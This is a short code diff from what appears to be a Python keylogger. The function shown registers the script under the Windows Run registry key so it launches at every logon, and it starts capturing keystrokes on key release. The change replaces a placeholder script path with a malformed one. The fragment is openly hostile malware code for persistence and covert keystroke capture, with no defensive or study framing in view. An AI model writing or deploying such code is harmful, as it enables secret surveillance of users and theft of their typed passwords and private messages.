@@ -58,7 +58,7 @@ def add_to_registry():
     key = reg.HKEY_LOCAL_MACHINE
     key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
     with reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS) as regkey:
-        reg.SetValueEx(regkey, "Keylogger", 0, reg.REG_SZ, sys.executable + ' "<PATH_TO_KEYLOGGER_SCRIPT>"')
+        reg.SetValueEx(regkey, "Keylogger", 0, reg.REG_SZ, sys.executable + ' "C:\\>"')
         
 # Start the keylogger
 keyboard.on_release(keylogger)
